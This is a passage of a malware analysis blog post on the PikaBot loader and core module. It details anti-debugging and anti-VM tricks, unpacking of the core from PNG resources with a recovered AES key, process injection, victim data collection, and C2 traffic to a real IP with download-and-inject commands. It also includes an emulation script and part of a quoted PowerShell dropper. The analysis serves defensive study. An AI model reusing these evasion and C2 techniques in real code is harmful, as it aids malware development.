        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%209.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%209.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%209.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%209.png"
        title="Untitled" width="1079" height="163" /></p>
<ol start="2">
<li>
<p>check <code>BeingDebugged</code> flag.</p>
</li>
<li>
<p>Win32 API <code>CheckRemoteDebuggerPresent</code> and <code>IsDebuggerPresent</code></p>
</li>
<li>
<p>delay the execution using <code>beep</code> function to escape Sandbox environments.</p>
</li>
<li>
<p>Anti-VM trick is that it imports different Libraries that don&rsquo;t exist in most of the VMs and Sandboxes. Libraries are: <code>NlsData0000.DLL</code> , <code>NetProjW.DLL</code> , <code>Ghofr.LL</code> and <code>fg122.DLL</code>.</p>
</li>
<li>
<p>Checks <code>NtGlobalFlag</code> as it is equal zero by default but set to 0x70 if a debugger is attached.</p>
</li>
<li>
<p>Calls <code>NtQueryInformationProcess</code> with <code>ProcessDebugPort</code> (0x7) Flag.</p>
</li>
<li>
<p>Function <code>sub_10002315</code> has a couple of <em>Anti debugging &amp; Anti Emulation</em> checks. The first it Uses <code>GetWriteWatch</code> and <code>VirtualAlloc</code> APIs To test for a Debugger attached or Sandbox environment by making a call to <code>VirtualAlloc</code> with <code>MEM_WRITE_WATCH</code> Flag specified, then call <code>GetWriteWatch</code> to retrieve the addresses of the allocated pages that has been written to since the allocation or the write-track state has been reset. <a href="https://github.com/BaumFX/cpp-anti-debug/blob/master/anti_debug.cpp#L260" target="_blank" rel="noopener noreffer ">PoC</a>.
The second check is a series of function calls that are responsible for checking if the malware runs in sandbox or emulation environment. its return values will determine if the system is running normal or something is happening (Sandbox or emulation). It starts by checking the atom name using <code>GlobalGetAtomNameW</code> passing invalid <code>nAtom = 0</code> parameter and checking the return value <em>(Should be 0)</em>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2010.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2010.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2010.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2010.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2010.png"
        title="Untitled" width="1031" height="218" /></p>
<p>The next is to call <code>GetEnvirnmentVariableA</code> with <code>lpName =  %random_file_name_that_doesnt_exist?[]&lt;&gt;@\\;*!-{}#:/~%</code> expecting it to return 0 as it is likely to have an environment variable name like that.
Then, it calls <code>GetBinaryTypeA</code> with <code>lpApplicationName = %random_file_name_that_doesnt_exist?[]&lt;&gt;@\\;*!-{}#:/~%</code> expecting it to return 0 as well.
Then it calls <code>HeapQueryInformation</code> with invalid <code>HEAP_INFORMATION_CLASS</code> value (69). Same thing with <code>ReadProcessMemory</code> API passing invalid address <code>0x69696969</code>.
Then, it is called <code>GetThreadContext</code> passing reused allocated memory and not a pointer to <code>Context</code> structure.</p>
</li>
<li>
<p>Uses <code>SetLastError</code> and <code>GetLastError</code> with <em>OutputDebugStringA(&ldquo;anti-debugging test.&rdquo;)</em> to check if the debugger attached, the debug message will be printed successfully and. If the debugger is not attached, the error code will be changed indicating that no debugger is attached.</p>
</li>
<li>
<p>Check the number of processors using <code>GetSystemInfo</code>. Less than 2 return 0 indicating VM environment.</p>
</li>
<li>
<p>Uses <code>__rdtsc</code> twice to detect single stepping in the debuggers. the same thing with <code>QueryerformanceCounter</code> and <code>GetTickCount64</code>.</p>
</li>
<li>
<p>Check the memory size with <code>GlobalMemoryStatusEx</code> to check if it is less than 2 GB.</p>
</li>
<li>
<p>Check the <code>Trap</code> flag (T) as indicator if single stepping.</p>
</li>
</ol>
<h3 id="unpacking-core-module">Unpacking Core module</h3>
<p>After doing Anti-Analysis checks, the Loader extracts the core module from the resource section. The core module is scattered through multiple PNG files in <code>RCData</code> -In this sample- Resource. It checks for 4 Bytes string in the resource, It&rsquo;s the beginning of the encrypted blob of the core component. In the sample we are discussing are <code>ttyf</code> and <code>oEom</code></p>
<p>After getting the offset of the beginning of the encrypted data. It decrypts a 20-byte string to use it as an XOR key to perform the first stage of the decryption. To get the key, the function needs to be emulated from the beginning as it makes some calculations to decode the twenty bytes -scattered through multiple variables- then, gather them into one variable.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png"
        title="Untitled" width="361" height="658" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling.const</span> <span class="kn">import</span> <span class="n">QL_VERBOSE</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">argv</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s2">&#34;qiling</span><span class="se">\\</span><span class="s2">examples</span><span class="se">\\</span><span class="s2">rootfs</span><span class="se">\\</span><span class="s2">x86_windows</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">pika.dll&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">rootfs</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;qiling</span><span class="se">\\</span><span class="s2">examples</span><span class="se">\\</span><span class="s2">rootfs</span><span class="se">\\</span><span class="s2">x86_windows&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ql</span> <span class="o">=</span> <span class="n">Qiling</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="n">argv</span><span class="p">,</span> <span class="n">rootfs</span><span class="o">=</span><span class="n">rootfs</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">QL_VERBOSE</span><span class="o">.</span><span class="n">OFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">begin</span><span class="o">=</span><span class="mh">0x10011A5E</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="mh">0x100121DF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x4c</span> <span class="p">,</span><span class="mh">0x14</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>The output</strong></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2012.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2012.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2012.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2012.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2012.png"
        title="Untitled" width="506" height="71" /></p>
<p>The core module is stored in two PNG images in the resource section. After The XOR operation is done, The XORed data is then decrypted using AES (CBC) Algorithm using a 32-byte key and the first 16-byte of the key used as an initialization vector. In this sample the Key is decrypted at the address <code>0x100114B0</code>, after emulating this section, we got the key <code>q10u9EYBtqXC1XUhmGmI7XUitdOpydzB</code>.
After Decrypting the Core module, it is injected in <code>C:\\Windows\\SysWOW64\\SndVol.exe</code> process.</p>
<blockquote>
<p>Note: the target process varies across the samples. I looked at another one and it was C:\Windows\System32\WWAHost.exe</p>
</blockquote>
<p>To get the core module, you can put a breakpoint on <code>WriteProcessMemory</code> and dump the memory buffer containing the injected code. In my case I had to change the name of the target process as the original target process does not exist on my machine.</p>
<blockquote>
<p>The whole binary is not written in one time so be patient OR write down the address of the injected code in the target process and put a breakpoint on ResumeThread and dump the address, it will be mapped to you will need to unmap it first. OR you can just dump the heap buffer that contains the decrypted data and dump the memory section, but it will need to be cleaned.</p>
</blockquote>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2013.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2013.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2013.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2013.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2013.png"
        title="Untitled" width="524" height="205" /></p>
<h3 id="third-stage-pikabot-core-module">Third stage: Pikabot Core module</h3>
<blockquote>
<p>I uploaded the unpacked sample to [malware bazaar] (MalwareBazaar | SHA256 11cbb0233aff83d54e0d9189d3a08d02a6bbb0ffa5c3b161df462780e0ee2d2d (abuse.ch))</p>
</blockquote>
<p>The core module uses the same string encryption method so applying the previous script works well.
The DLL contains a small number of functions and exports. <code>DllRegisterServer</code> contains a call to <code>sub_100025FF</code> function that has all the functionality of the Core module.
The same API dynamic resolving function (<em>sub_100036BA</em>) is used but more DLLs are added to use network and other functionalities required. The Additional DLLs are: <code>Wininet.dll</code>, <code>Advapi32.dll</code> and <code>NetApi32.dll</code></p>
<h3 id="system-language-check">System language check</h3>
<p>The first thing the malware does is to check the language code of the victim machine.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2014.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2014.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2014.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2014.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2014.png"
        title="Untitled" width="623" height="442" /></p>
<p>If the Region is one of the following lists, the malware will exit without any further activity.</p>
<ul>
<li>Georgia</li>
<li>Kazakhstan</li>
<li>Tajikistan</li>
<li>Russia</li>
<li>Ukraine</li>
<li>Belarus</li>
</ul>
<h3 id="anti-analysis-1">Anti Analysis</h3>
<p>Then, it performs some basic anti debugging checks (<code>sub_10001994</code>).</p>
<ul>
<li><code>BeingDebugged</code> flag.</li>
<li><code>NtGlobalFlag</code> ANDed with 0x70 to check if a debugger is attached.</li>
<li><code>rdtsc</code> instruction. check the delay between two calls.</li>
<li>Trap flag (T) of the <code>EFLAGS</code> register (T flag is the eighth bit)</li>
</ul>
<p>And it uses two Anti VM checks (<code>sub_10001AA6</code>):</p>
<ul>
<li>It executes <code>cpuid</code> instruction with <code>EAX = 0x40000000</code> to return Hypervisor brand and compare the returned value in the <em>ECX == 0x4D566572</em> and <em>EDX == 0x65726177</em> which are VMware CPUID value (for more explanation and how to defeat it, check this <a href="https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/" target="_blank" rel="noopener noreffer ">blog</a>).</li>
<li>Check the existence of Virtual Box related registry key <code>HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__</code>
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2015.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2015.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2015.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2015.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2015.png"
        title="Untitled" width="601" height="47" /></li>
</ul>
<p>The malware then checks the command execution functionality using a command that vary across the samples.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cmd.exe /C <span class="s2">&#34;ping localhost &amp;&amp; copy /b /y %s\\%s %s\\%s&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>passing this wide string to <code>wsprintfW</code> function with only one string <code>%SystemRoot%</code> -This could lead to unexpected behavior; it could raise access violation exception or just continue and only the first placeholder replaced. - The output is then executed using <code>CreateProcessW</code> and the return value is checked to determine the function&rsquo;s return value, if it is 0, return 0 if not, it will call <code>CloseHandle()</code> twice:</p>
<ul>
<li>The first with a valid handle to close the process created.</li>
<li>the second with invalid handle = 0, will return 0 -or should be 0 in normal systems, this could be anti-sandbox/emulation not sure as the function&rsquo;s return value is not used-.</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2016.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2016.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2016.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2016.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2016.png"
        title="Untitled" width="613" height="155" /></p>
<h3 id="hardcoded-mutex">Hardcoded Mutex!</h3>
<p>It uses a hardcoded mutex value <code>{99C10657-633C-4165-9D0A-082238CB9FE0}</code> to make sure that the victim is not infected twice by calling <code>CreateMutexW</code> followed by a call to <code>GetLastError</code> to check the last error code.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2017.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2017.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2017.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2017.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2017.png"
        title="Untitled" width="635" height="94" /></p>
<h3 id="collect-victim-info">Collect victim info.</h3>
<p>The next step is to collect some information about the victim system to send them to the C2 server (<code>sub_10008263</code>). The first thing you will see at the beginning of this function is a big stack string. This string is the schema that will be filled with the victim info, decoding this string will give us the following.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2018.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2018.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2018.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2018.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2018.png"
        title="Untitled" width="1042" height="84" /></p>
<p>The <strong>stream</strong> = <code>bb_d2@T@dd48940b389148069ffc1db3f2f38c0e</code> and <strong>version</strong> = <code>0.1.7</code> are predefined in the binary.
The information collection process is done as follows (<code>sub_1000241E</code>):</p>
<ul>
<li>Get the <code>os_version</code> from <code>OSMajorVersion</code> , <code>OSMinorVersion</code> and <code>OSBuildNumber</code> from the PEB structure and <code>GetProductInfo</code> API.</li>
<li>Get the victim&rsquo;s <code>username</code> by calling <code>GetUserNameW</code> API.</li>
<li>Get the <code>pc_name</code> by calling <code>GetComputerName</code> API.</li>
<li>Get the <code>cpu_name</code> by executing <code>cpuid</code> instruction with initial value <code>EAX = 0x80000000</code>.</li>
<li>Get the <code>gpu_name</code> by calling <code>EnumDisplayDevicesW</code> API.</li>
<li>Get the <code>ram_amount</code> by calling <code>GlobalMemoryStatusEx</code> API.</li>
<li>Get the <code>pc_uptime</code> by calling <code>GetTickCount</code> API.</li>
<li>Get the <code>screen_resolution</code> by calling <code>GetWindowRect</code> and <code>GetDesktopWindow</code> APIs.</li>
<li>Get the <code>arch</code> by calling <code>GetSystemInfo</code> API.</li>
<li>Get the <code>domain_name</code> by calling <code>GetComputerNameExW</code> API.</li>
<li>Get <code>domain_controller_name</code> by calling <code>DsGetDcNameW</code> API or return <code>unknown</code> if not available.
Each data item fills its location by calling <code>wsprintfW</code> function so, it will become like the following but with the victim collected data.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;{&#34;</span><span class="err">uuid</span><span class="s2">&#34;: &#34;</span><span class="err">uuid</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">stream</span><span class="s2">&#34;: &#34;</span><span class="err">bb_d</span><span class="mi">2</span><span class="err">@T@dd</span><span class="mi">48940</span><span class="err">b</span><span class="mi">389148069</span><span class="err">ffc</span><span class="mi">1</span><span class="err">db</span><span class="mi">3</span><span class="err">f</span><span class="mi">2</span><span class="err">f</span><span class="mi">38</span><span class="err">c</span><span class="mi">0</span><span class="err">e</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">os_version</span><span class="s2">&#34;: &#34;</span><span class="err">OS</span> <span class="err">version</span> <span class="err">and</span> <span class="err">build</span> <span class="err">number</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">product_number</span><span class="s2">&#34;: ,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">username</span><span class="s2">&#34;: &#34;</span> <span class="err">victim</span> <span class="err">username</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">pc_name</span><span class="s2">&#34;: &#34;</span><span class="err">computer</span> <span class="err">name</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">cpu_name</span><span class="s2">&#34;: &#34;</span><span class="err">cpu</span> <span class="err">name</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">arch</span><span class="s2">&#34;: &#34;</span><span class="err">system</span> <span class="err">architecture</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">pc_uptime</span><span class="s2">&#34;: ,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">gpu_name</span><span class="s2">&#34;: &#34;</span><span class="err">gpu</span> <span class="err">name</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">ram_amount</span><span class="s2">&#34;: &#34;</span><span class="err">ram</span> <span class="err">amount</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">screen_resolution</span><span class="s2">&#34;: &#34;</span><span class="err">screen</span> <span class="err">resolution</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">version</span><span class="s2">&#34;: &#34;</span><span class="mf">0.1</span><span class="err">.</span><span class="mi">7</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">av_software</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_name</span><span class="s2">&#34;: &#34;&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_controller_name</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_controller_address</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;}&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="c2-server-communication">C2 server communication</h3>
<p>The data collected is encoded using standard Base64 then encrypted using AES using the first 32-byte as the key and the first 16-byte of the key as the IV. then the data decoded with Base64 and sent to C2 server IP = <code>37.1.215.220</code> using <em>POST</em> request to the subdirectory <code>messages/INJtv97YfpOzznVMY</code>. The response is decoded in the same way too. The initial beacon contains <code>user_id=Him3xrn9e&amp;team_id=JqLtxw1h</code> hardcoded string added to IP parameters.
The request header is included in the binary as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded\\r\\n
</span></span><span class="line"><span class="cl">Accept: */*\\r\\n
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5\\r\\n
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate\\r\\n
</span></span><span class="line"><span class="cl">User-Agent: %s\\r\\n
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>User-Agent</code> is also in the binary, and it is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The response of the initial sent packet (knock) contains some commands to be executed on the victim machine:</p>
<table>
<thead>
<tr>
<th>Response</th>
<th>command</th>
</tr>
</thead>
<tbody>
<tr>
<td>whoami</td>
<td>execute whoami /all command</td>
</tr>
<tr>
<td>ipconfig</td>
<td>execute ipconfig /all command</td>
</tr>
<tr>
<td>screenshoot</td>
<td>take a snapshot of all the running processes of the victim machine using CreateToolhel32Snashot, Process32FirstW and Process32NextW</td>
</tr>
</tbody>
</table>
<p>The data requested decoded in the following form to be sent to the attacker but to different subdirectory <code>messages/ADXDAG6</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;uuid&#34;</span><span class="p">:</span> <span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="nt">&#34;additional_type&#34;</span><span class="p">:</span> <span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="s2">&#34; &#34;</span> <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>How The Command are executed</strong>
The malware add <code>%SystemRoot%\\SysWoW64\\cmd.exe</code> to the user environment variables and creates a pipe for covert communication and receiving the output. To get the output is uses the named pipe in <code>PeekNamedPipe</code> in an infinite loop and the break condition is when <code>WaitForSingleObject</code> sense an object state changing.</p>
<h3 id="c2-commands">C2 commands</h3>
<p>The Malware contains some other commands to do but not all of them are implemented yet.</p>
<h3 id="task">task</h3>
<p>If the command is <strong>task</strong> the malware do a specified task received from the C2 server, and it has some sub-commands:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2019.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2019.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2019.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2019.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2019.png"
        title="Untitled" width="477" height="531" /></p>
<p>The output of the commands is sent to another subdirectory <code>messages/TRCsUVyMigZyuUQ</code> with the same encoding schema followed before. The commands are the following:</p>
<p><strong>knock timeout</strong>
Seems to be not fully implemented but from the current state, it sends <code>Knock Timeout Changed!</code> to the server in the following JSON. It&rsquo;s used to delay any code execution on the victim machine.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> {&#34;uuid&#34;: &#34;%s&#34;, &#34;task_id&#34;: %s, &#34;execution_code&#34;: %d, &#34;data&#34;: &#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>additional</strong>
Nothing new here, it has the same <code>whoami</code>, <code>ipconfig</code> and <code>screenshoot</code> commands explained before.</p>
<p><strong>dll (exe)</strong>
Download another DLL or exe file and run it using Process injection technique. The bot responds with the following with the state of downloading process (in case of failure <code>Download Failed!</code>) and the state of the injection process (<code>Injection Success!</code> or <code>Injection Failed!</code>) but to another subdirectory <code>messages/DPVHLqEWR4uBk</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;uuid&#34;: &#34;%s&#34;, &#34;file_hash&#34;: &#34;%s&#34;, &#34;task_id&#34;: %s}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>shellcode</strong>
Download a shellcode and run by injecting it in a target process. Same as the DLL case</p>
<p><strong>cmd</strong>
Execute cmd commands on the target machine. It runs the command with the same method explained previously.</p>
<h3 id="balancer-and-init">balancer and init</h3>
<p>not implemented yet.</p>
<h3 id="another-variants">Another Variants</h3>
<p><a href="https://bazaar.abuse.ch/sample/67c61f649ec276eb57fcfe70dbd6e33b4c05440ee10356a3ef10fad9d0e224ef/" target="_blank" rel="noopener noreffer ">sample</a>
There are some other variants of the malware loader contains PowerShell script encrypted and stored on the <code>.rdata</code> section and it used to start the downloaded DLL using <code>regsvr32</code>
the following example script from <a href="https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html" target="_blank" rel="noopener noreffer ">OALABS Blog</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$nonresistantOutlivesDictatorial</span> <span class="p">=</span> <span class="s2">&#34;$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll&#34;</span><span class="p">;</span>
